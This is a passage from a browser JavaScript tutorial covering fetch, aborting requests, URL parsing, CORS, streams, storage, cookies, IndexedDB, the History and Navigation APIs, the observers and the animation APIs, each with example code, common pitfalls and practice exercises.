- [MDN: Document: visibilitychange event](https://developer.mozilla.org/en-US/docs/Web/API/Document/visibilitychange_event)

### `fetch`

`fetch(url, options)` returns a promise for a `Response`. It resolves as soon as the response headers arrive, and the body is read in a second asynchronous step. The promise rejects only when no response could be obtained: network failure, DNS failure, a CORS block, or an abort. An HTTP 404 or 500 is a successful round trip as far as `fetch` is concerned, so you must check the status yourself.

```js
async function getJSON(url, { signal } = {}) {
  const res = await fetch(url, { signal, headers: { Accept: 'application/json' } });
  if (!res.ok) {
    throw new Error(`HTTP ${res.status} ${res.statusText}`, { cause: res });
  }
  return res.json();
}

async function createTodo(todo) {
  const res = await fetch('/api/todos', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(todo),
  });
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  return res.status === 204 ? null : res.json();
}
```

The details that matter:

- `res.ok` is true for status 200 to 299. Check it before parsing, because an error page is often HTML and `res.json()` will then throw a confusing `SyntaxError`.
- The body is a stream and can be consumed once. Calling `res.json()` after `res.text()` throws; use `res.clone()` if you need both.
- `res.json()` on an empty body (a 204, for example) throws. Branch on the status or content type.
- When you send JSON you must set `Content-Type` yourself and stringify the body. When you send `FormData` or `URLSearchParams`, the browser sets it.
- Headers are read with `res.headers.get('content-type')`. Cross-origin, only a small safelist is visible unless the server sends `Access-Control-Expose-Headers`.
- Cookies are sent to same-origin URLs by default; cross-origin requests need `credentials: 'include'` and matching server headers.
- A network failure rejects with a `TypeError`, an abort with an `AbortError`. Distinguish them so you do not show an error for a request you cancelled.

**Try it:** Fetch a URL that returns 404 and one on a domain that does not exist. Log which one reaches `.then` and which reaches `.catch`, then write a wrapper that turns both into a consistent error object.

**Resources**
- [MDN: Using the Fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch)
- [MDN: Response](https://developer.mozilla.org/en-US/docs/Web/API/Response)
- [Fetch Standard](https://fetch.spec.whatwg.org/)

### Aborting and timeouts

An `AbortController` has a `signal` you hand to cancellable operations and an `abort()` method you call to cancel them. `fetch` listens to the signal: aborting rejects the promise with a `DOMException` named `AbortError` and, if the request is still in flight, closes the connection.

The classic use is a search box where an older, slower response must not overwrite a newer one:

```js
let controller;

async function search(query) {
  controller?.abort();                    // cancel the previous request
  controller = new AbortController();
  try {
    const res = await fetch(`/api/search?q=${encodeURIComponent(query)}`, {
      signal: controller.signal,
    });
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    render(await res.json());
  } catch (err) {
    if (err.name === 'AbortError') return;   // expected, not an error
    showError(err);
  }
}
```

`fetch` has no timeout option. Use `AbortSignal.timeout(ms)`, which returns a signal that aborts itself after the delay, rejecting with a `TimeoutError` (not `AbortError`), so you can tell a timeout from a user cancellation. Combine signals with `AbortSignal.any([...])`, which aborts when any input does:

```js
const signal = AbortSignal.any([controller.signal, AbortSignal.timeout(8000)]);
```

Points people miss:

- A controller is single-use. Once aborted, its signal stays aborted; create a new controller for each request.
- Aborting after the headers arrive still cancels the body read, so `await res.json()` can throw `AbortError` too. Keep it inside the `try`.
- Aborting does not undo anything on the server. A cancelled `POST` may already have been processed.
- Signals are a general mechanism. `addEventListener` accepts one, `signal.throwIfAborted()` and the `abort` event let you make your own async functions cancellable, and `signal.reason` carries the cause.

**Try it:** Build the search function above against any public API, throttle the network to Slow 4G, and type quickly. Confirm earlier requests show as cancelled in the Network panel. Then add an 800 ms `AbortSignal.timeout` and show a distinct "timed out" message.

**Resources**
- [MDN: AbortController](https://developer.mozilla.org/en-US/docs/Web/API/AbortController)
- [MDN: AbortSignal.timeout()](https://developer.mozilla.org/en-US/docs/Web/API/AbortSignal/timeout_static)
- [MDN: AbortSignal.any()](https://developer.mozilla.org/en-US/docs/Web/API/AbortSignal/any_static)

### `URL` and `URLSearchParams`

Treat URLs as structured data, not strings. `new URL(input, base)` parses a URL (resolving a relative one against `base`) and exposes its parts as properties: `protocol`, `host`, `hostname`, `port`, `pathname`, `search`, `hash`, `origin`, and `searchParams`. It throws a `TypeError` on invalid input; `URL.canParse(input, base)` and `URL.parse(input, base)` (which returns `null`) avoid the `try`/`catch`.

```js
const url = new URL('/search', 'https://api.example.com');
url.searchParams.set('q', 'fish & chips');
url.searchParams.append('tag', 'uk');
url.searchParams.append('tag', 'food');
url.href; // "https://api.example.com/search?q=fish+%26+chips&tag=uk&tag=food"

const params = new URLSearchParams(location.search);
params.get('page');        // "2", or null if missing: always a string
params.getAll('tag');      // ["uk", "food"]
params.has('debug');
Object.fromEntries(params); // loses repeated keys
```

`URLSearchParams` handles percent-encoding in both directions, which hand-concatenated strings get wrong the moment a value contains `&`, `=`, `#`, `+`, or a space. It can be built from a string, an object, an array of pairs, or a `FormData`, and can be passed directly as a `fetch` body (sent as `application/x-www-form-urlencoded`).

Gotchas:

- `set` replaces all values for a key; `append` adds another.
- Every value is a string. `Number(params.get('page') ?? 1)` and validate the result.
- `URLSearchParams` uses form encoding, where a space becomes `+` and a literal `+` in an unencoded input string is read as a space.
- If you must encode manually, use `encodeURIComponent` for a single value. `encodeURI` leaves `&`, `=`, and `?` alone and is almost never what you want.
- To change the current page's query without reloading, build a `URL` from `location.href`, edit `searchParams`, and pass it to `history.replaceState`.
- Compare origins with `new URL(link).origin === location.origin`, never with `startsWith`, which `https://example.com.evil.test` defeats.

`URLPattern` matches URLs against patterns such as `/users/:id` and is now available in all major browsers, which is useful for routers.

**Try it:** Write `withParams(urlString, obj)` that returns a URL string with the object's entries merged into the query, deleting keys whose value is `null`. Test it with values containing `&`, `#`, spaces, and emoji.

**Resources**
- [MDN: URL](https://developer.mozilla.org/en-US/docs/Web/API/URL)
- [MDN: URLSearchParams](https://developer.mozilla.org/en-US/docs/Web/API/URLSearchParams)
- [URL Standard](https://url.spec.whatwg.org/)

### CORS basics

The same-origin policy stops script on one origin from reading responses from another. An origin is the scheme, host, and port together, so `https://app.example.com` and `https://api.example.com` are different origins, as are `http://localhost:3000` and `http://localhost:5173`. Cross-Origin Resource Sharing (CORS) is how a server opts in to being read by other origins, using response headers.

For a "simple" request (GET, HEAD, or POST with only safelisted headers and a form-style content type), the browser sends the request with an `Origin` header and then checks the response for `Access-Control-Allow-Origin` matching your origin (or `*`). If it is missing, the request did reach the server, but the browser refuses to give your code the response.

Anything else, including `Content-Type: application/json`, an `Authorization` header, or methods like PUT and DELETE, triggers a **preflight**: an `OPTIONS` request asking permission first. The server must answer with `Access-Control-Allow-Methods` and `Access-Control-Allow-Headers` covering what you intend to send, or the real request is never made.

With `credentials: 'include'`, the server must send `Access-Control-Allow-Credentials: true` and name your exact origin; the wildcard `*` is rejected.

What trips people up:

- JavaScript sees only `TypeError: Failed to fetch`. The actual reason is deliberately hidden from script and shown in the Console and the Network panel. Read it there.
- CORS is enforced by the browser to protect users. It is not server security: `curl` and server-to-server calls ignore it entirely.
- The fix is on the server (send the right headers) or in your architecture (call your own same-origin backend or a dev-server proxy, which then calls the API). You cannot fix it from frontend code.
- `mode: 'no-cors'` does not bypass anything. It returns an opaque response with status 0 and an unreadable body.
- A failing or redirecting preflight, or an error response that lacks CORS headers, shows up as a CORS error even when the underlying problem is a 500 or an auth redirect.

**Try it:** From the Console on any site, `fetch('https://example.com')` and read the Console error in full. Then find a request in the Network panel on a real web app that has a preceding `OPTIONS` preflight, and match its request headers to the `Access-Control-Allow-*` response headers.

**Resources**
- [MDN: Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS)
- [MDN: CORS errors](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS/Errors)
- [web.dev: Cross-Origin Resource Sharing](https://web.dev/articles/cross-origin-resource-sharing)

### Streams

`response.body` is a `ReadableStream` of `Uint8Array` chunks. Methods like `res.json()` and `res.text()` simply read that stream to the end for you. Reading it yourself lets you act on data as it arrives: show download progress, render a long list progressively, or display tokens from a streaming AI response.

```js
const res = await fetch('/api/events.ndjson');
if (!res.ok) throw new Error(`HTTP ${res.status}`);

const reader = res.body.pipeThrough(new TextDecoderStream()).getReader();
let buffer = '';

while (true) {
  const { value, done } = await reader.read();
  if (done) break;
  buffer += value;
  const lines = buffer.split('\n');
  buffer = lines.pop();                 // keep the incomplete last line
  for (const line of lines) {
    if (line.trim()) handle(JSON.parse(line));
  }
}
if (buffer.trim()) handle(JSON.parse(buffer));
```

The essential point is that **chunk boundaries are arbitrary**. A chunk can end in the middle of a line, a JSON object, or even a multi-byte character. That is why the example buffers and splits on newlines, and why it uses `TextDecoderStream` (or `new TextDecoder()` with `decode(chunk, { stream: true })`) rather than decoding each chunk independently, which would corrupt characters split across chunks.

Other facts worth knowing:

- Getting a reader locks the stream. A body can be read once; `res.body.tee()` or `res.clone()` gives you two.
- Streams apply backpressure: if you read slowly, the browser stops pulling from the network.
- `ReadableStream` is async-iterable (`for await (const chunk of res.body)`), but support for that arrived late in some engines, so the reader loop above is the safest form.
- For progress, compare bytes read with the `Content-Length` header, which is absent for chunked responses and reports the compressed size when the body is compressed.
- Cancel with `reader.cancel()` or by aborting the fetch's signal.
- `TransformStream`, `CompressionStream`, and `pipeTo` let you build pipelines, and `blob.stream()` gives the same interface for files.

For server-pushed events in the standard `text/event-stream` format, `EventSource` handles parsing and reconnection for you.

**Try it:** Fetch a large file, read the body with a reader, and update a `<progress>` element from the running byte count and `Content-Length`. Log each chunk's `byteLength` to see how irregular the sizes are.

**Resources**
- [MDN: Using readable streams](https://developer.mozilla.org/en-US/docs/Web/API/Streams_API/Using_readable_streams)
- [MDN: ReadableStream](https://developer.mozilla.org/en-US/docs/Web/API/ReadableStream)
- [Streams Standard](https://streams.spec.whatwg.org/)

### `localStorage` and `sessionStorage`

Both are key-value stores of strings, scoped to an origin, with the same API: `getItem`, `setItem`, `removeItem`, `clear`, `key(i)`, and `length`. They differ in lifetime. `localStorage` persists until cleared and is shared by every tab on the origin. `sessionStorage` belongs to a single tab: it survives reloads and back/forward navigation, is not shared with other tabs, and is gone when the tab closes.

Only strings are stored, so anything else is silently coerced: `setItem('n', 5)` stores `"5"`, and an object becomes `"[object Object]"`. Serialise explicitly and read defensively, because the stored value may be missing, from an older version of your app, or edited by the user:

```js
function load(key, fallback) {
  try {
    const raw = localStorage.getItem(key);
    return raw === null ? fallback : JSON.parse(raw);
  } catch {
    return fallback;
  }
}

function save(key, value) {
  try {
    localStorage.setItem(key, JSON.stringify(value));
  } catch (err) {
    console.warn('Could not persist', err);   // QuotaExceededError, or storage blocked
  }
}
```

Limits and costs:

- Capacity is about 5 MiB per origin for each of the two stores. Exceeding it throws `QuotaExceededError`.
- Every call is **synchronous** and blocks the main thread, and data may be read from disk. Parsing a large JSON blob on every keystroke is a real performance problem. Read once at startup, keep state in memory, and write on change (debounced).
- It is unavailable in workers and can throw when storage is blocked by browser settings.
- Any script on the page can read it, so it is the wrong place for session tokens or anything sensitive; an XSS bug exposes everything in it.
- Browsers may evict storage for origins the user has not visited recently (Safari is the most aggressive), so treat it as a cache of preferences, not a database.

When another tab on the same origin changes `localStorage`, your tab receives a `storage` event on `window` with `key`, `oldValue`, and `newValue`. The tab that made the change does not. This is a simple way to sync tabs; `BroadcastChannel`, covered later, is the purpose-built one.

**Try it:** Persist a theme preference, then open the page in two tabs and keep them in sync with the `storage` event. In Application > Local Storage, hand-edit the value to invalid JSON and confirm your page still loads.

**Resources**
- [MDN: Web Storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API)
- [MDN: Storage quotas and eviction criteria](https://developer.mozilla.org/en-US/docs/Web/API/Storage_API/Storage_quotas_and_eviction_criteria)
- [web.dev: Storage for the web](https://web.dev/articles/storage-for-the-web)

### Cookies from JS

Cookies are small name-value pairs that the browser attaches to every matching HTTP request. That automatic sending is what makes them suitable for sessions, and what distinguishes them from Web Storage. They are normally set by the server with a `Set-Cookie` response header, and script can also read and write some of them through `document.cookie`, which has an odd interface:

```js
document.cookie;  // "theme=dark; lang=en" - every visible cookie in one string

// Assignment sets or updates ONE cookie; it does not replace the string
document.cookie = `theme=${encodeURIComponent('dark')}; Max-Age=31536000; Path=/; SameSite=Lax; Secure`;

// Delete by expiring it, with the same Path and Domain it was set with
document.cookie = 'theme=; Max-Age=0; Path=/';
```

Reading means splitting that string on `; ` and decoding. You only get names and values back, never the attributes. The attributes control scope and safety:

- `Max-Age` or `Expires`: without either, the cookie is a session cookie.
- `Path` and `Domain`: which URLs receive it.
- `Secure`: only sent over HTTPS.
- `SameSite`: `Strict`, `Lax` (the default in modern browsers), or `None` (requires `Secure`); controls whether it is sent on cross-site requests, which is the main defence against CSRF.
- `HttpOnly`: the cookie is invisible to JavaScript. It can only be set by the server.

`HttpOnly` exists because of XSS. If an attacker manages to run script on your page, `document.cookie` hands them every readable cookie, and a stolen session cookie is a stolen login. Marking the session cookie `HttpOnly` means injected script cannot read it. It can still make requests that carry the cookie, so this limits the damage rather than preventing it. It follows that you should not store auth tokens in JS-readable cookies or in `localStorage`.

Use JS-set cookies only for non-sensitive values the server needs on the first request, such as a theme or locale. Keep them small: each is limited to about 4 KB and travels with every request.

The asynchronous Cookie Store API (`await cookieStore.get('theme')`, `cookieStore.set({...})`, plus change events) is a much cleaner interface and is now in all major engines, though support is recent.

**Try it:** Set three cookies from the Console with different `Path` and `Max-Age` values and inspect them in Application > Cookies. Find an `HttpOnly` cookie on a site you are logged into and confirm it does not appear in `document.cookie`.

**Resources**
- [MDN: Document.cookie](https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie)
- [MDN: Using HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies)
- [MDN: Cookie Store API](https://developer.mozilla.org/en-US/docs/Web/API/Cookie_Store_API)

### IndexedDB

IndexedDB is the browser's real client-side database: asynchronous, transactional, available in workers, and able to hold large amounts of structured data, including `Date`, `Map`, `ArrayBuffer`, `Blob`, and `File`, without serialising to JSON. Reach for it when data outgrows `localStorage`: offline content, cached API responses, drafts with attachments, or anything you need to query.

The model:

- A **database** has a name and an integer **version**.
- It contains **object stores**, roughly tables, holding records identified by a key (often a `keyPath` such as `id`, optionally auto-incrementing).
- **Indexes** on a store let you look records up by other properties.
- All reads and writes happen inside a **transaction** scoped to named stores, in `readonly` or `readwrite` mode.
- Stores and indexes can only be created or changed in the `upgrade` callback, which runs when you open the database with a higher version number.

The native API is built on request objects and events and is painful to use directly. The small `idb` library wraps it in promises without changing the concepts:

```js
import { openDB } from 'idb';

const db = await openDB('notes-app', 1, {
  upgrade(db) {
    const store = db.createObjectStore('notes', { keyPath: 'id', autoIncrement: true });
    store.createIndex('by-updated', 'updatedAt');
  },
});

await db.add('notes', { title: 'Hello', updatedAt: Date.now() });
const note = await db.get('notes', 1);
const recent = await db.getAllFromIndex('notes', 'by-updated');
await db.put('notes', { ...note, title: 'Edited' });
```

The trap is transaction lifetime. A transaction auto-commits as soon as it has no pending requests when control returns to the event loop. If you `await` something unrelated in the middle, such as a `fetch`, the transaction is finished by the time you come back and the next operation throws `TransactionInactiveError`. Fetch first, then open the transaction and write.

Also know: values are copied with the structured clone algorithm, so functions and DOM nodes cannot be stored; a schema change requires a version bump, and other open tabs can block it until they close (handle `blocked` and `versionchange`); and storage is best-effort unless you call `navigator.storage.persist()`. Check usage with `navigator.storage.estimate()`.

**Try it:** With `idb`, create a store with an index, add twenty records, and query through the index. Inspect them in Application > IndexedDB. Then bump the version to add a second index and watch the upgrade callback run.

**Resources**
- [MDN: Using IndexedDB](https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API/Using_IndexedDB)
- [idb: IndexedDB with promises (GitHub)](https://github.com/jakearchibald/idb)
- [web.dev: Work with IndexedDB](https://web.dev/articles/indexeddb)

### History API

Single-page apps change the URL without loading a new document. The History API provides the primitive:

- `history.pushState(state, '', url)` adds a session history entry and changes the address bar. No request is made and no event fires.
- `history.replaceState(state, '', url)` does the same but overwrites the current entry.
- The `popstate` event on `window` fires when the user moves between entries with Back or Forward (or `history.back()`), with the entry's `state` in `event.state`.

A router built on it therefore has three jobs: intercept same-origin link clicks, call `pushState` and render; listen for `popstate` and render; and render once on initial load.

```js
document.addEventListener('click', (e) => {
  const a = e.target.closest('a[href]');
  if (!a || a.origin !== location.origin || a.target || a.hasAttribute('download')) return;
  if (e.button !== 0 || e.metaKey || e.ctrlKey || e.shiftKey || e.altKey) return;
  e.preventDefault();
  history.pushState(null, '', a.href);
  render(location.pathname);
});
window.addEventListener('popstate', () => render(location.pathname));
```

The modifier-key checks matter: without them you break "open in new tab". The URL must be same-origin, `state` must be structured-cloneable and should be small, and the server must return your app for every route or a reload on `/settings` is a 404. You also own what the browser used to do for free: updating `document.title`, moving focus to the new content, announcing the change to screen readers, and scroll restoration.

`history.replaceState` is also the right tool for reflecting UI state such as filters or a search query in the URL without adding a Back step. The Navigation API, covered in the next entry, replaces this patchwork with a single `navigate` event and is now in all major browsers; you still need to understand the History API for older browsers and for the many codebases and libraries built on it.

**Try it:** Build a three-route page with the History version, then test: Back, Forward, reload on a deep route, and Ctrl/Cmd-click. Log `history.length` and `history.state` at each step.

**Resources**
- [MDN: Working with the History API](https://developer.mozilla.org/en-US/docs/Web/API/History_API/Working_with_the_History_API)
- [MDN: History](https://developer.mozilla.org/en-US/docs/Web/API/History)
- [HTML Standard: The History interface](https://html.spec.whatwg.org/multipage/nav-history-apis.html#the-history-interface)

### Navigation API

The Navigation API is the purpose-built replacement for routing with the History API. Where the History approach makes you patch three separate places (link clicks, `popstate`, and your own `pushState` calls), the Navigation API gives you one event, `navigate`, that fires on the global `navigation` object for every same-document-capable navigation: link clicks, form submissions, Back and Forward, and programmatic calls. It became available in all major browsers in January 2026 (Baseline "newly available"), so older browsers still need the History fallback; feature-detect with `'navigation' in window`.

```js
navigation.addEventListener('navigate', (event) => {
  // Leave alone what you cannot or should not handle
  if (!event.canIntercept || event.hashChange || event.downloadRequest !== null) return;

  const url = new URL(event.destination.url);
  const view = resolve(url);          // your route table
  if (!view) return;                  // fall through to a normal page load

  event.intercept({
    async handler() {
      const data = await view.load({ signal: event.signal });
      view.render(data);
    },
  });
});
```

Calling `event.intercept()` turns the navigation into a same-document one. The browser updates the URL and history entry for you, keeps the navigation "in progress" until your `handler` promise settles (so the browser's loading indicator and `navigation.transition` reflect it), and afterwards resets focus and restores or resets scroll. If the user navigates again before the handler finishes, `event.signal` aborts, which you pass to `fetch` to cancel stale work. If the handler throws, `navigateerror` fires; `navigatesuccess` fires otherwise, which gives you one place for error UI and analytics.

What the event tells you: `navigationType` (`'push'`, `'replace'`, `'reload'`, `'traverse'`), `userInitiated`, `formData` for POST form submissions (so forms can be handled without a `submit` listener), and `destination.getState()`. `canIntercept` is false for cross-origin destinations, which you can never intercept.

The rest of the API replaces `history`:

- `navigation.navigate(url, { state, history: 'replace' })`, `navigation.back()`, and `navigation.reload()` return `{ committed, finished }` promises, so you can await the result of a navigation.
- `navigation.entries()` lists this frame's history entries for the current origin, each with a stable `key`, and `navigation.traverseTo(key)` jumps to one. The History API cannot show you the stack at all.
- `navigation.currentEntry.getState()` reads state; `navigation.updateCurrentEntry({ state })` changes it without navigating.

Limits to remember: `navigate` does not fire for the initial page load, so you still render once at startup; you must not intercept modified clicks that the browser already treats as "open in a new tab" (those never fire `navigate` in your window, so this is handled for you); and the server must still serve your app for every route, because a reload is a real request. Options such as `focusReset: 'manual'` and `scroll: 'manual'` let you take over the defaults when you need to.

**Try it:** Take a History API router with link interception and a `popstate` listener, and reimplement it with a single `navigate` listener. Add an artificial two-second delay in one view's loader, click two links in quick succession, and confirm through `event.signal` that the first load is aborted. Log `navigation.entries().map((e) => e.url)` as you go.

**Resources**
- [MDN: Navigation API](https://developer.mozilla.org/en-US/docs/Web/API/Navigation_API)
- [Chrome for Developers: Modern client-side routing: the Navigation API](https://developer.chrome.com/docs/web-platform/navigation-api)
- [HTML Standard: The navigation API](https://html.spec.whatwg.org/multipage/nav-history-apis.html#navigation-api)

### `IntersectionObserver`

`IntersectionObserver` tells you, asynchronously, when an element enters or leaves a viewport or scroll container, without you listening to `scroll` and measuring rectangles on every frame. The browser does the geometry off the critical path and calls you only when a threshold is crossed.

```js
const observer = new IntersectionObserver((entries, obs) => {
  for (const entry of entries) {
    if (!entry.isIntersecting) continue;
    entry.target.src = entry.target.dataset.src;
    obs.unobserve(entry.target);          // one-shot: stop watching
  }
}, {
  root: null,              // null means the viewport
  rootMargin: '200px 0px', // grow the root box: start loading 200px early
  threshold: 0,            // fire as soon as one pixel is visible
});

document.querySelectorAll('img[data-src]').forEach((img) => observer.observe(img));
```

The options: `root` is the scrollable ancestor to test against (or the viewport), `rootMargin` expands or shrinks that box with CSS-margin syntax in pixels or percentages, and `threshold` is a ratio or array of ratios (`[0, 0.5, 1]`) at which to notify.

Behaviour to understand:

- The callback fires once for each element right after `observe()`, reporting its initial state. Always check `entry.isIntersecting` rather than assuming a callback means "visible".
- It fires only when a threshold is crossed, not continuously. For scroll-linked progress you need many thresholds or a different tool (CSS scroll-driven animations).
- `threshold: 1` never fires for an element taller than the root, since it can never be fully visible.
- A zero-size or `display: none` element does not intersect.
- One observer can watch many elements; that is cheaper than many observers.
- Call `unobserve` or `disconnect` when finished.

Typical uses: infinite scroll with a sentinel element at the end of the list, pausing video or animation when off-screen, reveal-on-scroll effects, and view tracking. For ordinary images and iframes, the built-in `loading="lazy"` attribute does lazy loading with no JavaScript, so use the observer when you need custom behaviour.

**Try it:** Put an empty sentinel `<div>` after a list and observe it with `rootMargin: '300px'`. Append twenty more items each time it intersects. Log the entries on first `observe()` to see the initial callback.

**Resources**
- [MDN: Intersection Observer API](https://developer.mozilla.org/en-US/docs/Web/API/Intersection_Observer_API)
- [W3C: Intersection Observer (editor's draft)](https://w3c.github.io/IntersectionObserver/)
- [web.dev: Browser-level image lazy loading](https://web.dev/articles/browser-level-image-lazy-loading)

### `ResizeObserver`

`ResizeObserver` notifies you when an element's size changes for any reason: the window resized, a sibling grew, content was added, a font loaded, a sidebar collapsed. The `window` `resize` event only covers the first of those, and it tells you about the viewport rather than the element you care about.

```js
const ro = new ResizeObserver((entries) => {
  for (const entry of entries) {
    const { inlineSize, blockSize } = entry.contentBoxSize[0];
    drawChart(entry.target, inlineSize, blockSize);
  }
});
ro.observe(chartContainer);
// later: ro.unobserve(chartContainer) or ro.disconnect()
```

Each entry provides `contentRect` (the older form, a `DOMRect` of the content box) and the newer `contentBoxSize`, `borderBoxSize`, and `devicePixelContentBoxSize`. Those are arrays, hence the `[0]`, and use logical dimensions: `inlineSize` is width in horizontal writing modes. Pass `{ box: 'border-box' }` to `observe` to be notified on border-box changes instead.

Timing is what makes it useful: callbacks run after layout and before paint in the same frame, so you can respond to the new size without a visible flash. The callback also fires once when observation starts.

The hazard is a feedback loop. If your callback changes the observed element's size, the browser has to lay out again and re-notify. To prevent an infinite loop it only delivers notifications for elements deeper in the tree than the last round, defers the rest to the next frame, and reports the error "ResizeObserver loop completed with undelivered notifications". The cure is to avoid resizing what you observe: observe a container and size a child, or defer the write with `requestAnimationFrame`.

Use it for things CSS cannot do: resizing a `<canvas>` backing store, recomputing a chart or virtualised list, or truncating text by measurement. If you only want different styles at different component widths, CSS container queries do that declaratively with no JavaScript.

**Try it:** Give a `<div>` the CSS `resize: both; overflow: auto` and display its live dimensions inside it from a `ResizeObserver`. Then set the element's own width inside the callback and observe the loop error in the Console.

**Resources**
- [MDN: ResizeObserver](https://developer.mozilla.org/en-US/docs/Web/API/ResizeObserver)
- [web.dev: ResizeObserver: it's like document.onresize for elements](https://web.dev/articles/resize-observer)
- [CSS Working Group: Resize Observer](https://drafts.csswg.org/resize-observer/)

### `MutationObserver`

`MutationObserver` reports changes to the DOM tree itself: nodes added or removed, attributes changed, text edited. You mostly need it when the DOM is being changed by code you do not control, such as a third-party widget, a browser extension, user edits in a `contenteditable` region, or a framework rendering into a container you are integrating with. If your own code makes the change, call your follow-up logic directly instead.

```js
const observer = new MutationObserver((records) => {
  for (const record of records) {
    if (record.type === 'childList') {
      record.addedNodes.forEach((node) => {
        if (node.nodeType === Node.ELEMENT_NODE) enhance(node);
      });
    } else if (record.type === 'attributes') {
      console.log(record.attributeName, 'was', record.oldValue);
    }
  }
});

observer.observe(container, {
  childList: true,
  subtree: true,
  attributes: true,
  attributeFilter: ['class', 'aria-expanded'],
  attributeOldValue: true,
});
```

You must enable at least one of `childList`, `attributes`, or `characterData`. `subtree: true` extends observation to all descendants; without it you only see changes to the target's direct children and its own attributes.

Delivery is batched. Mutations made during a synchronous block of script are collected and delivered together in a microtask, after the script finishes and before the browser paints. So you get one callback with many records rather than a callback per change, and the DOM you see in the callback is the final state, which may differ from what an individual record describes.

Things to watch:

- `addedNodes` includes text nodes, and a node added with descendants appears as one record for the top node. To find matching elements inside, query the added node as well as testing it.
- Mutating the observed tree in your callback triggers the observer again. Guard against loops, or `disconnect()`, change, and re-`observe()`.
- Observing `document` with `subtree: true` and all options is expensive on busy pages. Scope to the smallest container and use `attributeFilter`.
- It observes attributes, not properties: typing in an input changes `value` the property and produces no record.
- `observer.takeRecords()` flushes pending records before you `disconnect()`.

**Try it:** Observe `document.body` with `childList` and `subtree`, then add and remove nodes from the Elements panel and log the records. Make three changes in one synchronous function and confirm you get a single callback with three records.

**Resources**
- [MDN: MutationObserver](https://developer.mozilla.org/en-US/docs/Web/API/MutationObserver)
- [DOM Standard: Mutation observers](https://dom.spec.whatwg.org/#mutation-observers)
- [javascript.info: Mutation observer](https://javascript.info/mutation-observer)

### `requestAnimationFrame`

`requestAnimationFrame(callback)` asks the browser to run your callback just before it next renders. That is the right moment for visual updates: the work lands in the frame the user will see, runs at the display's refresh rate, and pauses automatically when the tab is hidden. `setTimeout(fn, 16)` has none of those properties; it drifts against the display, fires mid-frame, and keeps running in the background.

It schedules one call. For an animation you request again from inside the callback:

```js
let rafId;
let start;

function frame(now) {              // now: a DOMHighResTimeStamp for this frame
  start ??= now;
  const t = Math.min((now - start) / 600, 1);   // progress over 600 ms
  box.style.transform = `translateX(${t * 300}px)`;
  if (t < 1) rafId = requestAnimationFrame(frame);
}
rafId = requestAnimationFrame(frame);
// cancelAnimationFrame(rafId) to stop
```

Always derive position from the timestamp, not from a fixed step per call. Displays refresh at 60, 90, 120 Hz or more, so "move 5px per frame" runs twice as fast on a 120 Hz screen, and frames get dropped under load.

The second everyday use is coalescing noisy events. `scroll`, `pointermove`, and `resize` can fire several times per frame; record the latest value in the handler and do the DOM work once in a frame callback:

```js
let ticking = false;
window.addEventListener('scroll', () => {
  if (ticking) return;
  ticking = true;
  requestAnimationFrame(() => { update(window.scrollY); ticking = false; });
}, { passive: true });
```

Understand where it sits in the frame: rAF callbacks run, then style and layout, then paint. So do your DOM writes in rAF and avoid reading layout after writing in the same callback, which forces a synchronous reflow. A long callback delays the frame; the budget at 60 Hz is about 16 ms for everything.

Because callbacks do not run in hidden tabs, never use rAF for logic that must happen on time. And for animating elements, CSS transitions or the Web Animations API (the next entry) are less code and can run off the main thread.

**Try it:** Animate a box with the code above, then write a version that moves a fixed number of pixels per frame. Compare the two with 6x CPU throttling in the Performance panel, and switch tabs mid-animation to see what each does.

**Resources**
- [MDN: Window.requestAnimationFrame()](https://developer.mozilla.org/en-US/docs/Web/API/Window/requestAnimationFrame)
- [HTML Standard: Animation frames](https://html.spec.whatwg.org/multipage/imagebitmap-and-animations.html#animation-frames)
- [web.dev: Optimize JavaScript execution](https://web.dev/articles/optimize-javascript-execution)

### Web Animations API

The Web Animations API (WAAPI) is the JavaScript interface to the same animation engine that runs CSS transitions and `@keyframes`. `element.animate(keyframes, options)` starts an animation and returns an `Animation` object you can pause, reverse, seek, speed up, cancel, and await. You get the performance of CSS animations (transform and opacity animations can run on the compositor, off the main thread) with values computed at runtime, and without writing a `requestAnimationFrame` loop.

```js
const animation = toast.animate(
  [
    { opacity: 0, transform: 'translateY(8px)' },
    { opacity: 1, transform: 'translateY(0)' },
  ],
  { duration: 200, easing: 'ease-out' },
);

await animation.finished;      // a promise; rejects with AbortError if cancelled
toast.focus();
```

Keyframes are an array of objects (or one object with arrays of values). Omit the first or last keyframe and the element's current computed style is used, so `el.animate({ transform: 'scale(1.1)' }, 150)` animates from wherever it is now. Options are `duration` in milliseconds (a bare number is shorthand for it), `delay`, `easing`, `iterations` (`Infinity` to loop), `direction`, `fill`, and `composite`.

Controlling a running animation: `pause()`, `play()`, `reverse()`, `finish()`, `cancel()`, and the writable `currentTime` and `playbackRate`. `element.getAnimations()` returns every animation on an element, including ones created by CSS transitions and CSS animations, which makes "wait until everything has settled" a one-liner:

```js
await Promise.all(dialog.getAnimations({ subtree: true }).map((a) => a.finished));
dialog.remove();
```

The details that catch people out:

- The default `easing` is `linear`, not `ease` as in CSS. Set it explicitly.
- When an animation ends, its effect is removed and the element snaps back to its underlying style. The tempting fix is `fill: 'forwards'`, but a forwards-filling animation stays alive indefinitely and overrides later style changes. Prefer setting the final state in CSS or inline style and animating *to* it, or call `animation.commitStyles()` followed by `animation.cancel()` to write the end values into inline style.
- `cancel()` rejects the `finished` promise. Catch it, or you get an unhandled rejection when an exit animation is interrupted.
- Respect the user's motion preference: check `matchMedia('(prefers-reduced-motion: reduce)').matches` and skip or shorten the animation.
- Animating layout properties such as `width`, `height`, `top`, or `margin` forces layout on every frame. Animate `transform` and `opacity`.

Choose between the tools like this: CSS transitions and animations for state changes you can express as a class toggle; WAAPI when values are dynamic, when you need to sequence, await, or scrub; `requestAnimationFrame` only when you are drawing to a canvas or computing something per frame that an animation cannot express.

**Try it:** Animate a list item's removal: fade and collapse it with `element.animate()`, `await animation.finished`, then remove the node. Click a second delete during the first animation and make sure nothing throws. In DevTools, open the Animations drawer to inspect and slow down the animation.

